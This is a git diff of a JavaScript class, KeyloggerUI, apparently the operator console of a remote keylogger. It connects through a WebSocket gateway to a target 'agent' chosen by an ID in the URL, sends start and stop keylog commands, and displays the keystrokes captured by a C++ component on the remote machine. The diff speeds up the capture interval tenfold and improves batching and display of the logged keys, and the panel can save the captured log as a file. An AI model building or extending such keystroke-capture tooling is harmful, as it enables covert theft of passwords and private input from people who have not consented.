@@ -2,12 +2,10 @@ import * as Logic from './logic.js';
 
 class KeyloggerUI {
     constructor() {
-        // State
         this.isLogging = false;
-        this.logBuffer = ""; // Biến lưu toàn bộ nội dung keylog
-        this.originalOnKeylog = null; // Lưu callback gốc từ main.js
+        this.logBuffer = "";
+        this.originalOnKeylog = null;
 
-        // DOM Elements
         this.displayInput = document.getElementById('keylog-panel');
         this.btnMenu = document.querySelector('.btn-menu');
         this.btnStart = document.querySelector('.btn-start');
@@ -19,46 +17,31 @@ class KeyloggerUI {
     }
 
     init() {
-        // Đợi window.gateway được khởi tạo từ main.js
         const waitForGateway = () => {
             if (!window.gateway) {
                 setTimeout(waitForGateway, 100);
                 return;
             }
 
-            // Lưu callback gốc từ main.js và wrap nó với handler của chúng ta
             this.originalOnKeylog = window.gateway.callbacks?.onKeylog;
             
-            // Override onKeylog callback để xử lý visual effects
             window.gateway.callbacks.onKeylog = (data, senderId) => {
-                // Gọi handler gốc để update display (từ main.js)
-                // if (this.originalOnKeylog) {
-                //     this.originalOnKeylog(data, senderId);
-                // }
-                // Xử lý visual effects và buffer riêng của keylog.js
                 this.handleIncomingKey(data, senderId);
             };
 
-            // 2. Gán sự kiện cho các nút
             if (this.btnMenu) this.btnMenu.addEventListener('click', () => { window.location.href = 'Feature_menu.html'; });
             if (this.btnStart) this.btnStart.onclick = () => this.startKeylog();
             if (this.btnStop) this.btnStop.onclick = () => this.stopKeylog();
             if (this.btnSave) this.btnSave.onclick = () => this.saveToDevice();
 
-            // 3. Inject CSS để phục vụ việc "nháy đèn" phím khi nhận tín hiệu
             this.injectActiveStyle();
-            
-            // 4. Đọc agent ID từ URL và tự động setTarget (nếu có)
             Logic.initAgentTargetFromURL();
-            
             this.logSystem("Ready. Press 'Start keylog' to begin.");
         };
 
         waitForGateway();
     }
 
-
-    // --- Command Functions ---
 
     startKeylog() {
         if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
@@ -73,9 +56,7 @@ class KeyloggerUI {
         }
 
         this.isLogging = true;
-        
-        // Gửi lệnh Start Keylog. Interval 0.5s để buffer mảng cho đỡ lag network
-        Logic.startKeylog(0.5);
+        Logic.startKeylog(0.05);
         
         if (this.btnStart) {
             this.btnStart.style.backgroundColor = "#22c55e"; 
@@ -95,98 +76,98 @@ class KeyloggerUI {
         }
     }
 
-    // --- Core Logic: Xử lý dữ liệu nhận về ---
-
-    /**
-     * Xử lý luồng data nhận được từ Socket (Bây giờ hỗ trợ Array)
-     * @param {string|string[]} data - Mảng các phím hoặc chuỗi ký tự
-     */
     handleIncomingKey(data, senderId) {
         if (!this.isLogging) return;
 
-        // --- TRƯỜNG HỢP 1: Dữ liệu là Mảng (Vector<string> từ C++) ---
         if (Array.isArray(data)) {
+            let batchText = "";
+            const normalizedKeys = [];
+            
             data.forEach(keyToken => {
-                // Chuẩn hóa token từ C++ (VD: "[ENTER]" -> "\n")
                 const normalizedChar = this.normalizeKey(keyToken);
-                
-                // 1. Lưu buffer
-                this.logBuffer += normalizedChar;
-                
-                // 2. Hiển thị text
-                this.updateDisplay(normalizedChar);
-                
-                // 3. Hiệu ứng Visual
-                this.visualizeKey(keyToken, normalizedChar); 
+                normalizedKeys.push({ raw: keyToken, normalized: normalizedChar });
+                batchText += normalizedChar;
+            });
+            
+            this.logBuffer += batchText;
+            this.updateDisplayBatch(batchText);
+            
+            normalizedKeys.forEach(({ raw, normalized }) => {
+                this.visualizeKey(raw, normalized);
             });
             return;
         }
 
-        // --- TRƯỜNG HỢP 2: Dữ liệu là String (Backup logic cũ) ---
-        // Vẫn giữ lại Logic.processKeylogData nếu backend gửi dạng cũ hoặc message hệ thống
         const processed = Logic.processKeylogData(data, senderId);
         if (processed.processed && processed.chars) {
+            let batchText = "";
             processed.chars.forEach(char => {
-                this.logBuffer += char;
-                this.updateDisplay(char);
+                batchText += char;
+            });
+            this.logBuffer += batchText;
+            this.updateDisplayBatch(batchText);
+            processed.chars.forEach(char => {
                 this.visualizeKey(char, char);
             });
         }
     }
 
-    /**
-     * Chuyển đổi các tag đặc biệt từ C++ sang ký tự hiển thị
-     */
     normalizeKey(token) {
-        // Mapping các tag từ file KeyboardController.cpp
         switch (token) {
+            case "[RETURN]": 
             case "[ENTER]": 
-            case "\n": return "\n"; // Xuống dòng
+            case "\n": return "[RETURN]";
             
             case "[TAB]": return "\t";
             
-            case "[BACK]": return "Backspace"; // Dùng từ khóa này để hàm updateDisplay xử lý xóa
+            case "[DELETE]":
+            case "[BACK]": return "[BACK]";
             
             case "[SPACE]": 
             case " ": return " ";
             
-            case "[ESC]": return ""; // Không in gì cả
-            case "[CTRL]": return ""; 
-            
             default:
-                // Nếu là format "[123]" (Unknown key code), bỏ qua hoặc in ra nguyên văn
-                if (token.startsWith("[") && token.endsWith("]") && token.length > 1) {
-                    return ""; // Ẩn các phím hệ thống lạ
+                if (token && token.startsWith("[") && token.endsWith("]") && token.length > 1) {
+                    return token;
                 }
-                return token; // Trả về ký tự thường (a, b, c, 1, 2...)
+                return token || "";
         }
     }
 
     updateDisplay(char) {
         if (!this.displayInput) return;
 
-        if (char === '\b') {
-            this.displayInput.value = this.displayInput.value.slice(0, -1);
-            return;
+        if (char === "[BACK]" || char === "[DELETE]") {
+            this.displayInput.value += "[BACK]";
+        } else if (char === "[RETURN]" || char === "[ENTER]") {
+            this.displayInput.value += "[RETURN]";
         } else if (char === '\n' || char === '\r') {
-            this.displayInput.value += "↵ "; 
+            this.displayInput.value += "[RETURN]";
         } else if (char === '\t') {
             this.displayInput.value += "→ ";
-        } else if (char.length === 1 || (char.startsWith('[') && char.endsWith(']'))) {
+        } else if (char) {
             this.displayInput.value += char;
         }
         
-        this.displayInput.scrollLeft = this.displayInput.scrollWidth;
+        this.displayInput.scrollTop = this.displayInput.scrollHeight;
     }
 
-    /**
-     * Tìm phím trên bàn phím ảo và nháy đèn
-     * @param {string} rawToken - Token gốc từ C++ (VD: "[ENTER]")
-     * @param {string} displayChar - Ký tự hiển thị (VD: "\n")
-     */
+    updateDisplayBatch(batchText) {
+        if (!this.displayInput || !batchText) return;
+
+        let displayText = batchText
+            .replace(/\[BACK\]|\[DELETE\]/g, "[BACK]")
+            .replace(/\[RETURN\]|\[ENTER\]/g, "[RETURN]")
+            .replace(/\n|\r/g, "[RETURN]")
+            .replace(/\t/g, "→ ");
+
+        this.displayInput.value += displayText;
+        this.displayInput.scrollTop = this.displayInput.scrollHeight;
+    }
+
     visualizeKey(rawToken, displayChar) {
         let targetKey = null;
-        const lowerChar = char.toLowerCase();
+        const lowerChar = displayChar ? displayChar.toLowerCase() : '';
 
         const specialCharMap = {
             '\n': 'enter',
@@ -199,11 +180,14 @@ class KeyloggerUI {
             '[return]': 'enter',
             '[tab]': 'tab',
             '[delete]': 'backspace',
+            '[back]': 'backspace',
             '[del]': 'del',
             '[esc]': 'esc',
             '[cmd]': 'win',
+            '[win]': 'win',
             '[caps]': 'caps',
             '[opt]': 'alt',
+            '[alt]': 'alt',
             '[ctrl]': 'ctrl',
             '[left]': '<-',
             '[right]': '->',
@@ -230,25 +214,24 @@ class KeyloggerUI {
             '[f14]': 'scr',
             '[f15]': 'pau',
             '[numlock]': 'num',
+            '[scroll]': 'scroll',
             '[shift]': 'shift',
-            '[fn]': 'fn',
-            '[alt]': 'alt'
+            '[fn]': 'fn'
         };
 
         let searchText = null;
         
-        if (char.startsWith('[') && char.endsWith(']')) {
-            searchText = bracketMap[lowerChar];
-        } else if (specialCharMap[char]) {
-            searchText = specialCharMap[char];
-        } else {
+        if (rawToken && rawToken.startsWith('[') && rawToken.endsWith(']')) {
+            searchText = bracketMap[rawToken.toLowerCase()];
+        } else if (displayChar && specialCharMap[displayChar]) {
+            searchText = specialCharMap[displayChar];
+        } else if (displayChar) {
             searchText = lowerChar;
         }
 
-        if (!searchText) return; // Không tìm thấy mapping
+        if (!searchText) return;
 
         for (let key of this.keys) {
-            // Lấy text hiển thị trên phím hoặc class đặc biệt
             let keyText = key.innerText.toLowerCase().trim();
             
             if (searchText === 'space' && keyText === '' && key.classList.contains('k-6-25')) {
@@ -262,20 +245,15 @@ class KeyloggerUI {
             }
         }
 
-        // Kích hoạt hiệu ứng
         if (targetKey) {
-            // Reset animation cũ nếu đang chạy
             targetKey.classList.remove('active-simulation');
-            void targetKey.offsetWidth; // Trigger reflow
-
+            void targetKey.offsetWidth;
             targetKey.classList.add('active-simulation');
             setTimeout(() => {
                 targetKey.classList.remove('active-simulation');
             }, 200);
         }
     }
-
-    // --- File Operations (Giữ nguyên) ---
 
     saveToDevice() {
         if (!this.logBuffer) {
@@ -304,8 +282,6 @@ class KeyloggerUI {
         this.logSystem(">>> Log saved & cleared.");
     }
 
-    // --- Helpers ---
-
     logSystem(msg) {
         console.log(`[KeylogUI] ${msg}`);
     }
@@ -326,7 +302,6 @@ class KeyloggerUI {
     }
 }
 
-// Khởi chạy khi DOM load xong
 document.addEventListener('DOMContentLoaded', () => {
     window.keyloggerApp = new KeyloggerUI();
 });
